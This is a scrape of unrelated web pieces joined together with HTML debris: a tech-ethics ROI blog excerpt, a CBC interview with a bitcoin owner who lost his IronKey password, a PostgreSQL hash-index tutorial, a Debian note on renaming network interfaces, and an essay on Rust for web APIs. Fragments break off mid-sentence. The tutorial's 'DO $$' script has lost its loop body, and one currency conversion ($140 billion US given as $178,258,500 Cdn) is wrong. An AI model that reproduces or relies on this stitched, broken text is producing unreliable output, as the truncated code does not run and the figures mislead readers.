<!-- -->Professor Ralph O’Swarm studied risk attitudes in 100 executives and found that they “do not portray the risk-takers we hear so much of in industrial folklore.”, “They quash new ideas in favor of marginal improvements, cost-cutting, and “safe” investments.” </span><a href="https://hbr.org/2020/03/your-company-is-too-risk-averse" target="_blank" rel="noopener"><u><span>hbr.org</span></u></a></span></p><blockquote id="viewer-9tlfe"><span><em><span>In current practice, however, executives in large corporations are reluctant to propose and advocate for risky projects.

At a very rudimentary level embedding ethics into your work will keep you a step ahead of compliance regulation and reduces the risk of negative PR from unethical business practices. Is it because it’s difficult to perceive the potential monetary value of ethics? Or the value lost by not incorporating ethics? 

At Hattusia although we believe that the value of ethics extends far beyond the bottom line on a balance sheet; it does have financial value.

<span>We’ve seen the potential financial impact that can be caused by not embedding ethical practice into your products as Amazon and IBM have had to remove facial recognition products from the market due to a growing mistrust over the quality of the technology and its applications. As well as the costs of product withdrawals this lack of trust can also be a major barrier to future revenue. Just recently Deliveroo lost a court case over their use of what was deemed a discriminatory algorithm. </span><a href="https://www.vice.com/en/article/7k9e4e/court-rules-deliveroo-used-discriminatory-algorithm" target="_blank" rel="noopener"><u><span>vice.com</span></u></a><span> </span></span></p><blockquote id="viewer-deo8q"><span><span><em>“If you can demonstrate that you are a trustworthy designer of technology, that will lead to economic value because more people will want to do business with you”. </em></span></span></blockquote><p id="viewer-1hr18"><span><span>- Will Griffin, Chief Ethics Officer at Hypergiant </span>

<span>The examples above have shown the potential financial reward of embedding tech ethics into your organisation. The Hattusia Ethics ROI calculator is designed to play a part in building your case for tech ethics but it is important to paint a holistic picture about why ethics is vital for modern business. </span></span></p></div></div></div></div></article></div></div>]]>

Or, he would be if only he could remember his password.&nbsp;</p>  <p>The&nbsp;San Francisco software developer and CEO was an early adopter of bitcoin. Back in&nbsp;2011, he produced <a href="https://www.youtube.com/watch?v=Um63OQz3bjo">an animated video explaining how the digital currency works</a>. For his efforts, a bitcoin enthusiast awarded him&nbsp;7,002 bitcoins.</p>  <p>Later that year, he lost&nbsp;the password to his&nbsp;IronKey, the USB hard drive that contains the digital wallet that holds his bitcoins. Since then, the currency's value has skyrocketed, and Thomas' holdings&nbsp;are worth $220 million US ($321 million Cdn.)&nbsp;</p>  <p>The IronKey&nbsp;gives users 10 password guesses before it encrypts its contents permanently, and Thomas' bitcoin is lost forever. He has two guesses left.</p>  <p>Here is part of his conversation with <em>As It Happens </em>host Carol Off.&nbsp;</p>  <p><strong>Stefan, how is it possible that one measly little password stands between you and hundreds of millions of dollars?</strong></p>  <p>Yeah, it's a really good question, isn't it?</p>  <p><strong>OK, this happens, right? We all know we lose our passwords. And so a little thing comes up when we're going to our bank or whatever [that says], "Did you forget your password?" And then you push it and then you go through a business of changing your password. So that's not available to you?</strong></p>  <p>No. Bitcoin is a decentralized system. And so if you hold your bitcoins, like I did, in a completely independent wallet — so not with an exchange, not with a bank, not with any kind of institution, but yourself — then it's just like cash. It's like gold. If you lose it, you lose it. There's no recovery process for that.</p>  <p>Since then, a lot of people have come up with all kinds of clever solutions like, you know, metal wallets where you can put down your secret keys and things like that. But most of that didn't exist back then. Back then, you had to kind of come up with your own solution. And apparently I didn't do a very good job of that.</p>    <blockquote><span><span><svg version="1.1" focusable="false" x="0px" y="0px" width="30px" height="25px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g><g><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g display="none"><g display="inline"> <path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg>I tried everything.

How many people do you think are not able to access their fortunes?</strong></p>  <p><a href="https://www.nytimes.com/2021/01/12/technology/bitcoin-passwords-wallets-fortunes.html">In The New York Times article about this</a>, they had an estimate, which was something like [$140 billion US ($178,258,500 Cdn) is] locked up in these wallets. And so you can imagine it's probably hundreds of thousands, if not millions of people, who are in my situation.</p>  <p><strong>But I think they said it was 20 per cent of all the bitcoin accounts are owned by people who can't access them [according</strong> <strong>to the cryptocurrency data firm Chainalysis].</strong></p>  <p>Yeah, I think a good chunk of that, especially, like, some of the larger ones, were very early wallets. So, you know, at the time, it might have been less money.</p>  <p>In my case, it was $140,000 ($179,000 Cdn), which for me was a huge amount — like an incomprehensible amount, even then. But of course, you know, once you can't access it and the price goes up, the number just gets bigger and bigger.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.4898812.1541775662!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/98129739.jpg 300w,https://i.cbc.ca/1.4898812.1541775662!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/98129739.jpg 460w,https://i.cbc.ca/1.4898812.1541775662!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/98129739.jpg 620w,https://i.cbc.ca/1.4898812.1541775662!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/98129739.jpg 780w,https://i.cbc.ca/1.4898812.1541775662!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/98129739.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.4898812.1541775662!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/98129739.jpg"></p></div><figcaption>A visual representation of the cryptocurrency bitcoin <!-- --> <!-- -->(Dan Kitwood/Getty Images)</figcaption></figure></span></p>  <p><strong>So what is it like for you? I mean, how many sleepless nights do you have thinking about the fact that you have $200 million that you can't get at?</strong></p>  <p>After I realized I lost the coins, I was completely destroyed. Like, when I think back to that, it's hard to even wrap my head around how I felt that those couple of weeks.</p>  <p>And I tried everything. I would stay up all night trying different ideas for how to recover it, or just,&nbsp;like, staring at the ceiling for hours. You know, just what you imagine you would do if you lost that sort of money.</p>  <p>And then after a couple of weeks of that, I got to a point where I started to realize that the chances of recovery were not very good. And we'll get into, you know, what that last little glimmer of hope is in a moment.</p>  <p>So I sort of had to make a decision, right? Like, either I let this define the rest of my life and I keep thinking back to it and I just, you know, like you said,&nbsp;lose sleep for the rest of my life, or&nbsp;I just, you know, face the fact that this money is gone, these bitcoins are gone, and I move forward and I get back to work. And I chose the latter.</p>  <p><strong>OK, so what's the last glimmer of hope?</strong></p>  <p>The famous USB stick with the 10 tries.</p>  <p>There is a way to take a scanning electron microscope and take apart the physical chip and literally go into the the silicon chip and take away layer by layer, like a few atoms thick, and then read out the actual memory cells. And then with that technique, you should be able to bypass that limit of 10 tries, and then you can have a supercomputer try, you know, billions of passwords per second.</p>  <p>Now, the problem is that, first of all, that requires a specialized laboratory. It's very expensive. Only a few people in the world can do it. And even then, it's kind&nbsp;of high risk. It&nbsp;could just fail, and then the chip is destroyed and you don't get a second try.</p>  <p>Back then, it definitely wasn't worth it. I think now it probably is worth it. But it still requires a lot of organizing and logistics, and even then it's not guaranteed.</p>  <p>Now that this has been in the news, I'm getting lots and lots of people reaching out, some of whom are the types of people who have access to that kind of equipment and the kind of expertise needed. And so I'm talking to them to see, you know, if we should attempt a recovery and, like, what it would cost, etcetera.</p>    <p><strong>So what happens? I mean, hundreds of millions of dollars are now sort of locked up ... Where does it go? Who gets it? </strong></p>  <p>Because I'm not selling those Bitcoins, that means that there's a little bit less supply in the market ... and so potentially the price is infinitesimally higher, right?&nbsp;</p>  <p>Other holders, in theory, profit. Although you have to imagine, like because of this risk, maybe there are people that maybe don't invest in bitcoin because they're worried about this. And so maybe that kind of makes up for it and kind of that reduces the price. So, again, that's probably almost a better question for an economist to opine on.</p>  <p><strong>There are those who are saying that this now just belies the value of investing in this kind of bitcoin. For all the advantages it has, that you don't have to deal with institutions and governments, that obviously it has its pitfalls. And so are you one of those? Are you one of the people who think that maybe this kind of currency is not a good idea?</strong></p>  <p>This experience has definitely changed my opinion about bitcoin in terms of I was one of those people that was very excited about, you know, everyone can be their own bank and that sort of thing.</p>  <p>I know there's lots of bitcoin experts listening right now saying that, "This could never happen to me!" But for me personally, like, I kind of was very humbled by that experience.</p>  <p>Nowadays, my belief is that I think it's really nice that we live in a free country where we can have the choice and we can hold our own bitcoins if we want to. And I think that's a right that I would fight for preserving. There have been some discussions in the U.S. about maybe not allowing that in the future, and I think that's something I'm absolutely against.</p>  <p>But at the same time, I think that as a practical matter, for most people, it's probably better to hold their bitcoins with a custodian, like an institution that specializes in securing and storing bitcoins.</p>  <hr>  <p><em>Written by Sheena Goodyear.

        <hr>
<p>If you work with databases you are probably familiar with B-Tree indexes. They are used to enforce unique and primary-key constraints, and are the default index type in most database engines. If you work with text, geography or other complex types in PostgreSQL, you may have dipped your toes into GIN or GIST indexes. If you manage a read intensive database (or just follow this blog), you may also be familiar with BRIN indexes.</p>
<p>There is another type of index you are probably not using, and may have never even heard of. It is wildly unpopular, and until a few PostgreSQL versions ago it was highly discouraged and borderline unusable, but under some circumstances it can out-perform even a B-Tree index.</p>
<p><strong>In this article we re-introduce the Hash index in PostgreSQL!</strong></p>

<h2 id="hash-index"><a href="#hash-index">Hash Index</a></h2>
<p>Just like the name suggests, Hash indexes in PostgreSQL use a form of the hash table data structure. Hash table is a common data structure in many programming languages. For example, a <a href="https://docs.python.org/3/library/stdtypes.html#typesmapping" rel="noopener">Dict</a> in Python, a <a href="https://docs.oracle.com/javase/8/docs/api/java/util/HashMap.html" rel="noopener">HashMap</a> in Java or the new <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map" rel="noopener">Map</a> type in JavaScript.</p>
<p>To understand how you can benefit from Hash indexes, it's best to understand how they work.</p>
<h3 id="hash-function"><a href="#hash-function">Hash Function</a></h3>
<p>Hash indexes use a <em>hash function</em>. PostgreSQL's hash function maps any database value to a 32-bit integer, the <em>hash code</em> (about 4 billion possible hash codes). A good hash function can be computed quickly and "jumbles" the input uniformly across its entire range.</p>
<p>The hash codes are divided to a limited number of <em>buckets</em>. The buckets map the hash codes to the actual table rows.</p>

<figcaption>Hash Index</figcaption>

<p>A simple hash function for an integer type is modulo: divide a number by another number, and the remainder is the hash code. For example, to divide values across 3 buckets you can use the hash function <code>mod(3)</code>:</p>
<div><pre><span></span><span>db=#</span> <span>SELECT</span> <span>n</span><span>,</span> <span>mod</span><span>(</span><span>n</span><span>,</span> <span>3</span><span>)</span> <span>AS</span> <span>bucket</span> <span>FROM</span> <span>generate_series</span><span>(</span><span>1</span><span>,</span> <span>10</span><span>)</span> <span>AS</span> <span>n</span><span>;</span>
<span> n  │ bucket</span>
<span>────┼────────</span>
<span>  1 │      1</span>
<span>  2 │      2</span>
<span>  3 │      0</span>
<span>  4 │      1</span>
<span>  5 │      2</span>
<span>  6 │      0</span>
<span>  7 │      1</span>
<span>  8 │      2</span>
<span>  9 │      0</span>
<span> 10 │      1</span>
</pre></div>


<p>When a new value is added to the index, PostgreSQL applies the hash function to the value and puts the hash code and a pointer to the tuple in the appropriate bucket. In the example above using the hash function <code>mod(3)</code>, if you insert the value <code>5</code> the index entry will be added to bucket <code>2</code>, because <code>5 % 3 = 2</code>.</p>
<p>When you query a value using a Hash index, PostgreSQL does the opposite. It takes the value and applies the hash function to determine which bucket may hold matching tuples. Once the bucket is identified, PostgreSQL will fetch the tuples referenced in that bucket and match them against your query.</p>
<h3 id="hash-collision"><a href="#hash-collision">Hash Collision</a></h3>
<p>You may have noticed that multiple values can map to the same bucket; this is called a <em>collision</em>. For example, the hash function <code>mod(3)</code> returned the hash code <code>2</code> for the values <code>2</code>, <code>5</code> and <code>8</code>.</p>
<p>What PostgreSQL actually does, is to first use a hash function to produce an integer hash code:</p>
<div><pre><span></span><span>db=#</span> <span>SELECT</span>
    <span>hashtext</span><span>(</span><span>'text'</span><span>),</span>
    <span>hashchar</span><span>(</span><span>'c'</span><span>),</span>
    <span>hash_array</span><span>(</span><span>array</span><span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>]),</span>
    <span>jsonb_hash</span><span>(</span><span>'{"me": "haki"}'</span><span>::</span><span>jsonb</span><span>),</span>
    <span>timestamp_hash</span><span>(</span><span>now</span><span>()</span><span>::</span><span>timestamp</span><span>);</span>

<span>─[ RECORD 1 ]──┬────────────</span>
<span>hashtext       │ -451854347</span>
<span>hashchar       │ 203891234</span>
<span>hash_array     │ -325393530</span>
<span>jsonb_hash     │ -1784498999</span>
<span>timestamp_hash │ 1082344883</span>
</pre></div>


<p>It then uses <code>mod(n_buckets)</code> to determine which bucket the tuple should be put in. This can cause multiple values to end up in the same bucket. This is why even after the bucket is identified, the database still needs to sift through the hash codes in the bucket and recheck the condition to filter only the matching tuples.</p>

<figcaption>Hash Index overflow pages</figcaption>
</figure>

<p>As rows are added to the index, it's possible for a bucket's primary page to fill up. In this case, additional rows are written to overflow pages. The overflow pages contain index entries that did not fit in the bucket's primary page.</p>
<h3 id="index-split"><a href="#index-split">Index Split</a></h3>
<p>At some point, the database can decide it needs to split a bucket into two buckets. PostgreSQL uses special hash functions that ensure values in a bucket can be split into exactly two buckets. When a bucket is split, additional storage is allocated to the index.</p>

<figcaption>Hash Index split</figcaption>
</figure>

<p>Luckily, PostgreSQL does all the heavy lifting for you, so you don't have to decide what hash function to use, or how many buckets there are.</p>
<p>If you want to learn more about the internals of Hash indexes in PostgreSQL, check out the <a href="https://github.com/postgres/postgres/blob/master/src/backend/access/hash/README" rel="noopener">readme on "Hash Indexing"</a>.</p>
<hr>
<h2 id="hash-index-in-postgresql"><a href="#hash-index-in-postgresql">Hash Index in PostgreSQL</a></h2>
<p>Hash indexes were discouraged prior to PostgreSQL 10. If you read the <a href="https://www.postgresql.org/docs/9.6/indexes-types.html" rel="noopener">index type documentation for PostgreSQL 9.6</a> you'll find a nasty warning about Hash indexes. According to the warning, Hash indexes are not written to the WAL so they cannot be maintained in replicas, and they are not automatically available after a crash, so you need to manually rebuild them.</p>
<p>Starting at PostgreSQL 10 these limitations were resolved, and <a href="https://www.postgresql.org/docs/10/release-10.html#id-1.11.6.20.5.3.3" rel="noopener">Hash indexes are no longer discouraged</a>.</p>
<h3 id="creating-hash-indexes"><a href="#creating-hash-indexes">Creating Hash Indexes</a></h3>
<p>Now that you know how Hash indexes work in PostgreSQL, you are ready to see them in action. To illustrate, we'll create an imaginary URL shortening service.</p>
<p>A URL shortener service, such as "bit.ly" or the late "goo.gl", provides a short random URL that points to a longer URL. For example, you can have the short url <code>https://short.url/hb9837</code> point to the longer URL <code>https://hakibenita.com/automating-the-boring-stuff-in-django-using-the-check-framework</code>. We'll call the <code>hb9837</code> part of the short URL the <code>key</code>.</p>
<p>To implement your URL shortening service, create a table to store the mapping between the keys and the full URLs:</p>
<div><pre><span></span><span>CREATE</span> <span>TABLE</span> <span>shorturl</span> <span>(</span>
    <span>id</span> <span>serial</span> <span>primary</span> <span>key</span><span>,</span>
    <span>key</span> <span>text</span> <span>not</span> <span>null</span><span>,</span>
    <span>url</span> <span>text</span> <span>not</span> <span>null</span>
<span>);</span>
</pre></div>


<p>The table includes an auto incrementing primary key <code>id</code>, a text field for <code>key</code>, and a <code>url</code> field containing the full URL.</p>
<p>Next, create a B-Tree and a Hash index on both fields:</p>
<div><pre><span></span><span>CREATE</span> <span>INDEX</span> <span>shorturl_key_hash_index</span> <span>ON</span> <span>shorturl</span> <span>USING</span> <span>hash</span><span>(</span><span>key</span><span>);</span>
<span>CREATE</span> <span>UNIQUE</span> <span>INDEX</span> <span>shorturl_key_btree_index</span> <span>ON</span> <span>shorturl</span> <span>USING</span> <span>btree</span><span>(</span><span>key</span><span>);</span>

<span>CREATE</span> <span>INDEX</span> <span>shorturl_url_hash_index</span> <span>ON</span> <span>shorturl</span> <span>USING</span> <span>hash</span><span>(</span><span>url</span><span>);</span>
<span>CREATE</span> <span>INDEX</span> <span>shorturl_url_btree_index</span> <span>ON</span> <span>shorturl</span> <span>USING</span> <span>btree</span><span>(</span><span>url</span><span>);</span>
</pre></div>


<p>You might have noticed that the B-Tree on <code>key</code> is a unique index, but the Hash index is not. This is because Hash indexes currently cannot be used to enforce unique constraints.</p>
<h3 id="hash-index-size"><a href="#hash-index-size">Hash Index Size</a></h3>
<p>The first thing you want to do is to compare the size of a Hash index to the size of a similar B-Tree index:</p>
<div><pre><span></span><span>CREATE</span> <span>EXTENSION</span> <span>"uuid-ossp"</span><span>;</span>

<span>DO</span> <span>$$</span>
<span>BEGIN</span>

    <span>END</span> <span>LOOP</span><span>;</span>
<span>END</span><span>;</span>
<span>$$</span><span>;</span>
</pre></div>


<p>To get a better sense of how both indexes behave, keep track of the size of the indexes as rows are inserted to the table:</p>
<ul>
<li>Generate 1,000,000 short urls one by one</li>
<li>Every 10,000 rows log the size of all four indexes</li>
<li>Use <code>uuid_generate_v4</code> from the <a href="https://www.postgresql.org/docs/current/uuid-ossp.html" rel="noopener">uuid-ossp</a> package to generate UUIDs as keys</li>
<li>Generate a long URL from a 6-digit domain so it's not unique, but almost unique</li>
</ul>
<p>Running the script on PostgreSQL 13 and plotting the results gives the following chart:</p>
<figure><img alt="Hash vs. B-Tree index size" src="https://hakibenita.com/images/01-postgresql-hash-index.png"><figcaption>Hash vs. B-Tree index size</figcaption>
</figure>
<p>The chart provides several interesting observations:</p>
<ol>
<li>
<p><strong>The Hash index is smaller than the B-Tree index</strong>: Almost all along the way, the Hash index on both fields is smaller than the size of the corresponding B-Tree index.</p>
</li>
<li>
<p><strong>Hash index grows in increments</strong>: Unlike the B-Tree index that seems to grow linearlly as rows are inserted to the table, the Hash index grows in sudden increments. These sudden increments are caused when a split is triggered to allocate space for more buckets. When that space runs out, another split is triggered and so on.</p>
</li>
<li>
<p><strong>Hash index size is not affected by the size of the indexed value</strong>: A Hash index stores the hash codes of the index field values. A B-Tree on the other hand, stores the actual value of the indexed field in its leaves, so the size of the indexed value affects the size of a B-Tree index, but not the size of a Hash index.</p>
</li>
<li>
<p><strong>Hash index size is not affected by the selectivity of the indexed value</strong>: The selectivity of the URL field is different than that of the key field, which is almost unique, but the Hash index on both fields is the same size. A size of a B-Tree index on the other hand, can vary based on the selectivity of the data (see note below about "B-Tree deduplication").</p>
</li>
</ol>
<div>
<p>B-Tree deduplication</p>
<p>PostgreSQL 13 introduced a new <a href="https://www.postgresql.org/docs/current/btree-implementation.html#BTREE-DEDUPLICATION" rel="noopener">B-Tree deduplication</a> mechanism that reduces the size of a B-Tree indexes with many duplicate values. In the chart above, the size of the B-Tree index on the <code>url</code> field is smaller than the size of the index on the <code>key</code> field because it has fewer unique values.</p>
<figure><img alt="Hash vs. B-Tree index size on PostgreSQL 12" src="https://hakibenita.com/images/02-postgresql-hash-index.png"><figcaption>Hash vs. B-Tree index size on PostgreSQL 12</figcaption>
</figure>
<p>If you run the same script with deduplication disabled, or on PostgreSQL versions prior to 13, you'll see that the size of the index is the same (as long as values are the same size).</p>
</div>
<p>The script you ran before imitates a workload of an OLTP-like system, where single rows are constantly being added to the table. This is the size of the indexes after the script finished:</p>
<div><pre><span></span><span>db=#</span> <span>\di+</span> <span>shorturl*</span>
<span>          Name           │ Type  │ Table    │Size</span>
<span>─────────────────────────┼───────┼──────────┼────────</span>
<span>shorturl_key_btree_index │ index │ shorturl │ 73 MB</span>
<span>shorturl_key_hash_index  │ index │ shorturl │ 37 MB</span>
<span>shorturl_url_btree_index │ index │ shorturl │ 53 MB</span>
<span>shorturl_url_hash_index  │ index │ shorturl │ 36 MB</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I use Debian Bullseye on a Lenovo T14 AMD. This laptop is great and works very well with a recent Linux kernel (5.10).
It has 3 network interfaces: a wireless one, a wired one with a normal ethernet port, and a second wired one, with a prioprietary port, for Lenovo docks, I don’t use.</p><p>The interfaces are named <code>wlp3s0</code>, <code>enp2s0f0</code> and <code>enp5s0</code> in Debian. Yes, it turns out nowadways network interfaces are not simply named wlanX for wifi and ethX for ethernet as they conveniently used to.
There are good reasons for this change: depending on which interface was detected first during each boot, they could change name randomly. For example what was <code>eth0</code> on a boot could become <code>eth1</code> on the next one, which is problematic, as interface names can be used in some configuration files.</p><p>The solution is to give each interface some unique predictable names, based on the “BIOS device name” of the interface. This is great, but really annoying in practice, as I always forget how the interfaces are named, and which of the wired interfaces is the one I use 😕</p><h2 id="renaming-network-interfaces">Renaming network interfaces</h2><p>Thanksfully, it is possible to rename interfaces. On Debian, this is done using systemd configuration, as apparently nowadays udev is part of systemd.</p><p>First, we need to find the “path id” of the device, that is to say a unique identifier of the device, based on the PCI domain, the number of the bus and the device position on the bus.
It can be done using the command <code>udevadm</code>. For my wireless interface <code>wlp3s0</code> the command looks like:</p><div><pre><code data-lang="shell">$ sudo udevadm test-builtin path_id /sys/class/net/wlp3s0 2&gt;/dev/null 
ID_PATH<span>=</span>pci-0000:03:00.0
ID_PATH_TAG<span>=</span>pci-0000_03_00_0
</code></pre></div><p>In this case the <code>path_id</code> is <code>pci-0000:03:00.0</code>. I can then create a <code>.link</code> file to choose the name of the interface;</p><div><pre><code data-lang="shell">$ sudoedit /etc/systemd/network/10-rename-wlp3s0.link 
$ cat /etc/systemd/network/10-rename-wlp3s0.link 
<span>[</span>Match<span>]</span>
Path<span>=</span>pci-0000:03:00.0
<span>[</span>Link<span>]</span>
Name<span>=</span>wlan0
</code></pre></div><p>I did this for all the interfaces I wanted to rename, then rebooted and checked the result:</p><div><pre><code data-lang="shell">$ ip addr

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Rust is an amazing language. It has enabled excellent CLI tools like <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> and <a href="https://github.com/ogham/exa">exa</a>. Companies like Cloudflare are using Rust for their own systems and <a href="https://blog.cloudflare.com/tag/rust/">encouraging people to write Rust to run microservices</a>. Rust makes it possible to write really fast software that’s secure, tiny, and more concise than C++ or C.</p><p>If I were writing a geocoder, a routing engine, a real-time messaging platform, a database, or a CLI tool, Rust would be at the top of the list.</p><p>But last year, I spent some time trying to make Rust work for a plain-vanilla API to power a normal website. It wasn’t a very good fit.</p><h3 id="lots-of-missing-pieces">Lots of missing pieces</h3><p>Rust has a fair number of web server frameworks, database connectors, and parsers. But building authentication? You have only <em>very</em> low-level parts. Where Node.js will give you <a href="http://www.passportjs.org/">passport</a> and Rails has <a href="https://github.com/heartcombo/devise">devise</a> and Django gives you an <a href="https://developer.mozilla.org/en-US/docs/Learn/Server-side/Django/Authentication">auth model out of the box</a>, in Rust you’re going to build this system by learning how to shuttle a shared vec into low-level crypto libraries. There are libraries trying to fix this, like <a href="https://github.com/breard-r/libreauth">libreauth</a>, but they’re nascent and niche. Repeat for plenty of other web framework problem areas.</p><p>How about SDKs? In mainstream languages, you’ll be able to plug into Google Cloud services, AWS, or Stripe by bringing in an official library. Those libraries are mostly great. The <a href="https://aws.amazon.com/sdk-for-javascript/">aws-sdk-js</a> and <a href="https://stripe.com/docs/libraries">Stripe libraries</a>, for example, are incredibly well-designed and maintained.</p><p>Not so with Rust. There are a few third-party libraries trying to fill in the blanks, which is great, but with the sheer velocity of those services, will they really be able to give a quality experience?</p><p>Some people will say <em>well, X language is so good you can just write an SDK yourself in a weekend!</em> To which I must reply, no.</p><p>Rust’s ecosystem is rich in other domains. The crates for building CLIs, managing concurrency, doing really impressive operations with binary data and low-level parsers - they’re spectacular.</p><h3 id="rusts-compiler-is-faster-than-it-was-but-still-slow">Rust’s compiler is faster than it was, but still slow</h3><p>I’ve been reading <a href="https://blog.mozilla.org/nnethercote/2020/09/08/how-to-speed-up-the-rust-compiler-one-last-time/">Nicholas Nethercote’s</a> <em>excellent</em> blog for years now, in which he describes how the Rust team has made the compiler faster. And they certainly have made it faster!</p><p>But compared to other languages you build websites with, it’s slow. It’s much slower than the Go compiler and much, much slower than the startup time for interpreted languages like JavaScript, Ruby, and Python.</p><p>Once your code is compiled, everything’s amazing! But in my case, this basic API - which wasn’t even feature-complete and was by no means a complex system - took more than ten minutes to compile. On the weak hardware of <a href="https://cloud.google.com/cloud-build">Google Code Build</a>, it would run out of time, every time. We couldn’t build anything.</p><p>Caching helps as long as you don’t have to rebuild cached dependencies. And, I don’t know, maybe <a href="https://blog.kodewerx.org/2020/06/the-rust-compiler-isnt-slow-we-are.html">slimming down dependencies</a> would help Rust projects compile faster. But <a href="https://serde.rs/">serde</a>, for example - the JSON and other-format serializer/deserializer that nearly everyone uses - takes up a huge chunk of compile time. Should we replace serde with something that compiles faster but lacks great documentation and ecosystem support? It’s a bad trade.</p><h3 id="rust-is-complicated">Rust is complicated</h3><p>Rust makes you think about dimensions of your code that matter tremendously for systems programming. It makes you think about how memory is shared or copied. It makes you think about real but unlikely corner cases and make sure that they’re handled. It helps you write code that’s incredibly efficient in every possible way.</p><p>These are all valid concerns. But for most web applications, they’re not the most important concerns. And buzzword-oriented thinking around them leads to some incorrect assumptions.</p><p>Take, for example, Rust’s safety. This is a big part of the marketing, and it’s absolutely correct: Rust’s main promise is to be both <em>safe</em> and <em>low-level</em> - it works without a garbage collector, while at the same time protecting against memory-based exploits. When you read “safety”, think about Rust competing with C. Code in C can reference arbitrary memory, can easily overflow and segfault. Rust code can be just as fast as that C code, but protect that memory access, and without the cost of a garbage collector or some kind of runtime checking.</p><p>But Rust’s memory rules aren’t more secure than Node.js’s or Python’s. Your web application written in Rust isn’t going to be systematically more or less secure than an application in Python or Ruby. High-level languages with garbage collectors pay a performance penalty in exchange for generally dodging this whole class of exploits and bugs. You can’t reference uninitialized memory in JavaScript because you simply can’t reference memory-as-memory in JavaScript.</p><details><summary>Sidenote…</summary>This is describing the design goal of Node.js and other systems - they do occasionally have bugs that creep into this problem area. The <a href="https://github.com/nodejs/node/issues/4660">previous behavior of Node.js's Buffer object, for example, is a good read.</a></details><p>Heck, if you ask <a href="https://deavid.wordpress.com/2020/01/18/actix-web-is-dead-about-unsafe-rust/">some people</a>, Rust is <em>less secure</em> than a GC’ed language for web apps if you use any crates that have <code>unsafe</code> code - which includes Actix, the most popular web framework, because <a href="https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html">unsafe code allows things like deferencing raw pointers</a>.</p><p>If you’re writing a video game, a pause to run garbage collection is bad. If you’re writing code for a microcontroller, any memory “overhead” or waste is really bad. But most web applications can spare a little memory overhead in exchange for productivity.</p><p>This argument is pretty much the same for the other attributes of Rust. Its concurrency primitives are <em>amazing</em> if you’re doing something complicated and need blistering-fast performance. But if you aren’t? The Rust async ecosystem is challenging, to say the least: there are different sorts of async, projects that span domains to do async implementations of unrelated stuff like <a href="https://tokio.rs/">tokio</a>.</p><p>It feels a lot less like Node.js, which had a good async story but ugly syntax, than Python Tornado or Twisted, which had a weird async story and also ugly syntax.</p><p>Async, I’m sure, will stabilize and homogenize and be a lot easier to do in the future. But I was working in the present.</p><h3 id="the-rust-ecosystem-is-not-web-centric">The Rust ecosystem is not web-centric</h3><p>There are many people currently learning Rust, writing CLI apps or low-level code in Rust, and having an extremely fun time. There are dramatically fewer people using Rust to write plain-vanilla web applications.</p><p>This is an important part of the equation for technology choices: are there people working with the tool <em>and</em> are they roughly in the same domain? Unfortunately, a lot of the incredibly exciting work in the Rust ecosystem has nothing to do with web application servers. There are some promising web frameworks - even a <a href="https://github.com/iron/iron">somewhat higher-level framework</a> - but they’re undoubtedly in a niche. Even Actix, the main web framework, has a <a href="https://github.com/actix/actix-web/graphs/contributors">very top-heavy set of contributors</a>.</p><p>If Rust grows at its current rate, the web portion of the community will reach a sort of critical mass, but right - I don’t think there are enough people using Rust for websites for it to be a practical tool for websites. And compare to other communities in which there are entire companies dedicated to building web applications with existing tools - not cutting-edge work, but the kind of stuff that differentiates a mature technology from a new one.</p><h3 id="the-juniper-crate-invites-n1s">The Juniper crate invites n+1s</h3><p>This part isn’t just about Rust, it’s about the GraphQL ecosystem and Rust’s involvement in that ecosystem is one example.</p><p><a href="https://www.infoq.com/articles/N-Plus-1/">The <strong>n+1</strong> problem</a> is something that everyone building web applications should understand. The gist is: you have a page of photos (1 query). You want to show the author of each photo. How many queries do you end up with: 1, combining the photos &amp; authors, or a query per photo to get the author after retrieving the photos? Or 2 queries, with the second having something like <code>user.id IN ids</code> to fetch all authors in a single pass and then reconnect them to their photos.</p><p>n+1 queries are usually the highest-priority database fixes: they’re usually high-impact, and changing an n+1 query into a single query is usually a big win. And we have lots of ways to try and resolve them: you can write SQL and try to get a lot done in a single query using CTEs and JOINs, like we did at Observable, or use an ORM layer like ActiveRecord that has <a href="https://guides.rubyonrails.org/active_record_querying.html#eager-loading-associations">quick ways to turn n+1 queries into predictable queries</a>.</p><p>We were using <a href="https://github.com/graphql-rust/juniper">Juniper</a>, a <a href="https://graphql.org/">GraphQL</a> server for Rust applications. GraphQL basically lets your <em>frontend application</em> define queries, instead of the backend. 